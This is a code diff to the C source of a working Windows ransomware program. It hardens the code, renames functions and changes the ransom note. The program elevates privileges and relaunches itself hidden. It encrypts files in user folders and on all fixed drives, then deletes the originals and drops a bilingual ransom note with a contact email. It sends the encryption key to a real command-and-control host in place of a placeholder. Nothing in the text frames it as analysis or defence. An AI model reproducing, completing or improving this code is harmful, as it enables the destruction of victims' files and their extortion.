@@ -12,6 +12,7 @@
 #include <bcrypt.h>
 #include <threadpoolapiset.h>
 #include <wininet.h>
+
 #define BUF_SIZE 65536
 
 typedef struct {
@@ -20,24 +21,29 @@ typedef struct {
     unsigned char x3[16];
 } XStruct;
 
-void y1(const char* x4, const unsigned char* x2, const unsigned char* x3);
-void y2(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6);
+void misc(const char* x4, const unsigned char* x2, const unsigned char* x3);
+void killme(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6, const char* id);
 int y3();
 void y4();
 void y5(unsigned char* x7, size_t x8);
 void y6(unsigned char* x2, unsigned char* x3);
 void y7(unsigned char* x2, unsigned char* x3);
+
 TP_CALLBACK_ENVIRON tpoolEnv;
 PTP_POOL tpool;
 PTP_CLEANUP_GROUP tpoolCleanupGroup;
 
 void CALLBACK tpoolCallback(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_WORK work) {
     XStruct* x9 = (XStruct*)context;
-    y1(x9->x1, x9->x2, x9->x3);
-    SecureZeroMemory(x9->x1, strlen(x9->x1));
-    free(x9->x1);
-    SecureZeroMemory(x9, sizeof(XStruct));
-    free(x9);
+    if (x9) {
+        misc(x9->x1, x9->x2, x9->x3);
+        if (x9->x1) {
+            SecureZeroMemory(x9->x1, strlen(x9->x1));
+            free(x9->x1);
+        }
+        SecureZeroMemory(x9, sizeof(XStruct));
+        free(x9);
+    }
 }
 
 void initThreadPool() {
@@ -58,14 +64,18 @@ void initThreadPool() {
 }
 
 void cleanupThreadPool() {
-    CloseThreadpoolCleanupGroupMembers(tpoolCleanupGroup, FALSE, NULL);
-    CloseThreadpoolCleanupGroup(tpoolCleanupGroup);
-    CloseThreadpool(tpool);
+    if (tpoolCleanupGroup) {
+        CloseThreadpoolCleanupGroupMembers(tpoolCleanupGroup, FALSE, NULL);
+        CloseThreadpoolCleanupGroup(tpoolCleanupGroup);
+    }
+    if (tpool) {
+        CloseThreadpool(tpool);
+    }
 }
 
-int checkAdmin() {
+int checkad() {
     BOOL isAdmin = FALSE;
-    PSID pSID;
+    PSID pSID = NULL;
     SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
     if (AllocateAndInitializeSid(&SIDAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
         DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSID)) {
@@ -75,8 +85,8 @@ int checkAdmin() {
     return isAdmin;
 }
 
-void elevatePrivileges() {
-    if (!checkAdmin()) {
+void relaunch() {
+    if (!checkad()) {
         TCHAR szPath[MAX_PATH];
         if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
             SHELLEXECUTEINFO sei = { sizeof(sei) };
@@ -93,7 +103,7 @@ void elevatePrivileges() {
     }
 }
 
-void y1(const char* x4, const unsigned char* x2, const unsigned char* x3) {
+void misc(const char* x4, const unsigned char* x2, const unsigned char* x3) {
     char modPath[MAX_PATH];
     GetModuleFileName(NULL, modPath, MAX_PATH);
     if (strstr(x4, ".exe") || _stricmp(x4, modPath) == 0) {
@@ -108,9 +118,9 @@ void y1(const char* x4, const unsigned char* x2, const unsigned char* x3) {
         fclose(inFile);
         return;
     }
-    HCRYPTPROV hProv;
-    HCRYPTKEY hKey;
-    HCRYPTHASH hHash;
+    HCRYPTPROV hProv = 0;
+    HCRYPTKEY hKey = 0;
+    HCRYPTHASH hHash = 0;
     if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
         fclose(inFile);
         fclose(outFile);
@@ -147,9 +157,11 @@ void y1(const char* x4, const unsigned char* x2, const unsigned char* x3) {
     unsigned char buf[BUF_SIZE];
     unsigned char encBuf[BUF_SIZE + 16];
     DWORD bytesRead, bytesWritten;
+    BOOL eof = FALSE;
     while ((bytesRead = fread(buf, 1, BUF_SIZE, inFile)) > 0) {
         bytesWritten = bytesRead;
-        if (!CryptEncrypt(hKey, 0, feof(inFile), 0, encBuf, &bytesWritten, sizeof(encBuf))) {
+        eof = feof(inFile);
+        if (!CryptEncrypt(hKey, 0, eof, 0, encBuf, &bytesWritten, sizeof(encBuf))) {
             CryptDestroyKey(hKey);
             CryptReleaseContext(hProv, 0);
             fclose(inFile);
@@ -165,25 +177,43 @@ void y1(const char* x4, const unsigned char* x2, const unsigned char* x3) {
     remove(x4);
 }
 
-int readmeExists(const char* x5) {
+int ransomnoteexists(const char* x5) {
     char rPath[256];
     snprintf(rPath, sizeof(rPath), "%s\\README.txt", x5);
     struct stat buffer;
     return (stat(rPath, &buffer) == 0);
 }
-void createReadme(const char* x5, const char* id) {
-    if (readmeExists(x5)) {
+
+void dropransomnote(const char* x5, const char* id) {
+    if (ransomnoteexists(x5)) {
         return;
     }
     char rPath[256];
     snprintf(rPath, sizeof(rPath), "%s\\README.txt", x5);
     FILE* readme = fopen(rPath, "w");
     if (readme) {
-        fprintf(readme, "Your files have been fucked. There's no way back.\nYour personal ID: %s\nWhat can you do about it?\nStart all over again.", id);
+        fprintf(readme,
+            "Your files have been fucked.\n"
+            "Your personal ID: %s\n"
+            "What can you do about it?\n"
+            "Play chess against me. If you win, you will get your files back.\n"
+            "Send your personal ID to d3cryptme@firemail.cc\n"
+            "You will get a chess invite.\n"
+            "Good luck!\n"
+            "-------------------------------------\n"
+            "Ваши файлы были зашифрованы.\n"
+            "Ваш личный идентификатор: %s\n"
+            "Что вы можете с этим сделать?\n"
+            "Играйте со мной в шахматы. Если вы выиграете, ваши файлы будут возвращены.\n"
+            "Отправьте ваш личный идентификатор на d3cryptme@firemail.cc\n"
+            "Вы получите приглашение на шахматную партию.\n"
+            "Удачи!\n", id, id);
         fclose(readme);
     }
 }
-int checkSystemDir(const char* x5) {
+
+
+int sysdir(const char* x5) {
     const char* sysDirs[] = {
         "C:\\Windows",
         "C:\\Users\\Default",
@@ -198,12 +228,12 @@ int checkSystemDir(const char* x5) {
     return 0;
 }
 
-void y2(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6, const char* id) {
+void killme(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6, const char* id) {
     WIN32_FIND_DATA findData;
     HANDLE hFind;
     char searchPath[512];
     char fullPath[512];
-    if (checkSystemDir(x5)) {
+    if (sysdir(x5)) {
         return;
     }
     snprintf(searchPath, sizeof(searchPath), "%s\\*", x5);
@@ -216,27 +246,31 @@ void y2(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6
             snprintf(fullPath, sizeof(fullPath), "%s\\%s", x5, findData.cFileName);
             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                 if (x6 < 3) {
-                    y2(fullPath, x2, x3, x6 + 1, id);
+                    killme(fullPath, x2, x3, x6 + 1, id);
                 }
-            }
-            else {
+            } else {
                 const char* fileExtension = strrchr(findData.cFileName, '.');
-                if (!readmeExists(x5) && (fileExtension == NULL || _stricmp(fileExtension, ".lnk") != 0)) {
-                    createReadme(x5, id);
+                if (!ransomnoteexists(x5) && (fileExtension == NULL || _stricmp(fileExtension, ".lnk") != 0)) {
+                    dropransomnote(x5, id);
                 }
                 XStruct* x9 = (XStruct*)malloc(sizeof(XStruct));
-                x9->x1 = _strdup(fullPath);
-                memcpy(x9->x2, x2, 32);
-                memcpy(x9->x3, x3, 16);
-                PTP_WORK work = CreateThreadpoolWork(tpoolCallback, x9, &tpoolEnv);
-                if (work) {
-                    SubmitThreadpoolWork(work);
-                }
-                else {
-                    SecureZeroMemory(x9->x1, strlen(x9->x1));
-                    free(x9->x1);
-                    SecureZeroMemory(x9, sizeof(XStruct));
-                    free(x9);
+                if (x9) {
+                    x9->x1 = _strdup(fullPath);
+                    if (x9->x1) {
+                        memcpy(x9->x2, x2, 32);
+                        memcpy(x9->x3, x3, 16);
+                        PTP_WORK work = CreateThreadpoolWork(tpoolCallback, x9, &tpoolEnv);
+                        if (work) {
+                            SubmitThreadpoolWork(work);
+                        } else {
+                            SecureZeroMemory(x9->x1, strlen(x9->x1));
+                            free(x9->x1);
+                            SecureZeroMemory(x9, sizeof(XStruct));
+                            free(x9);
+                        }
+                    } else {
+                        free(x9);
+                    }
                 }
             }
         }
@@ -244,40 +278,40 @@ void y2(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6
     FindClose(hFind);
 }
 
-void processFiles(const unsigned char* x2, const unsigned char* x3, int x6, const char* id) {
+void procfiles(const unsigned char* x2, const unsigned char* x3, int x6, const char* id) {
     KNOWNFOLDERID folders[] = { FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Pictures, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Contacts, FOLDERID_Favorites, FOLDERID_Links, FOLDERID_SavedGames, GUID_NULL };
-    PWSTR folderPath;
+    PWSTR folderPath = NULL;
     for (int i = 0; !IsEqualGUID(&folders[i], &GUID_NULL); i++) {
         if (SHGetKnownFolderPath(&folders[i], 0, NULL, &folderPath) == S_OK) {
             char dirPath[MAX_PATH];
             wcstombs(dirPath, folderPath, MAX_PATH);
-            y2(dirPath, x2, x3, x6, id);
+            killme(dirPath, x2, x3, x6, id);
             CoTaskMemFree(folderPath);
         }
     }
     for (char drive = 'A'; drive <= 'Z'; drive++) {
         char rootPath[4] = { drive, ':', '\\', '\0' };
         if (GetDriveType(rootPath) == DRIVE_FIXED) {
-            y2(rootPath, x2, x3, x6, id);
+            killme(rootPath, x2, x3, x6, id);
         }
     }
 }
 
-void xorEncrypt(unsigned char* x7, size_t x8) {
+void xorobf(unsigned char* x7, size_t x8) {
     for (size_t i = 0; i < x8; i++) {
         x7[i] ^= 0xAA;
     }
 }
 
-void sendKeys(const unsigned char* key, const unsigned char* iv, const char* id) {
+void sendkeys(const unsigned char* key, const unsigned char* iv, const char* id) {
     HINTERNET hSession = InternetOpen("TLD13Browser/12.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) return;
-    HINTERNET hConnect = InternetConnect(hSession, "example.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    HINTERNET hConnect = InternetConnect(hSession, "xmb.pythonanywhere.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
         InternetCloseHandle(hSession);
         return;
     }
-    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/c2/data", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/c2/receiver", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
     if (!hRequest) {
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hSession);
@@ -307,33 +341,31 @@ void sendKeys(const unsigned char* key, const unsigned char* iv, const char* id)
     InternetCloseHandle(hSession);
 }
 
-void generateKeys(unsigned char* x2, unsigned char* x3, char* id) {
+void genkeys(unsigned char* x2, unsigned char* x3, char* id) {
     HCRYPTPROV hProv;
     if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
         CryptGenRandom(hProv, 32, x2);
         CryptGenRandom(hProv, 16, x3);
         CryptReleaseContext(hProv, 0);
-        xorEncrypt(x2, 32);
-        xorEncrypt(x3, 16);
-        sendKeys(x2, x3, id);
-    }
-    else {
+        xorobf(x2, 32);
+        xorobf(x3, 16);
+        sendkeys(x2, x3, id);
+    } else {
         exit(1);
     }
 }
 
-void decryptKeys(unsigned char* x2, unsigned char* x3) {
-    xorEncrypt(x2, 32);
-    xorEncrypt(x3, 16);
+void deobf(unsigned char* x2, unsigned char* x3) {
+    xorobf(x2, 32);
+    xorobf(x3, 16);
 }
 
-void generatePersonalID(char* id) {
+void perid(char* id) {
     const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
     for (int i = 0; i < 19; ++i) {
         if (i % 5 == 4) {
             id[i] = '-';
-        }
-        else {
+        } else {
             id[i] = charset[rand() % (sizeof(charset) - 1)];
         }
     }
@@ -342,7 +374,7 @@ void generatePersonalID(char* id) {
 
 int main(int argc, char* argv[]) {
     if (argc < 2) {
-        elevatePrivileges();
+        relaunch();
         ShellExecute(NULL, "open", argv[0], "--foodsum", NULL, SW_HIDE);
         return 0;
     }
@@ -350,14 +382,13 @@ int main(int argc, char* argv[]) {
     unsigned char x3[16];
     char personalID[20];
     srand((unsigned int)time(NULL));
-    generatePersonalID(personalID);
-    generateKeys(x2, x3, personalID);
-    decryptKeys(x2, x3);
+    perid(personalID);
+    genkeys(x2, x3, personalID);
+    deobf(x2, x3);
     initThreadPool();
     if (strcmp(argv[1], "--foodsum") == 0) {
-        processFiles(x2, x3, 0, personalID);
-    }
-    else {
+        procfiles(x2, x3, 0, personalID);
+    } else {
         return 1;
     }
     cleanupThreadPool();
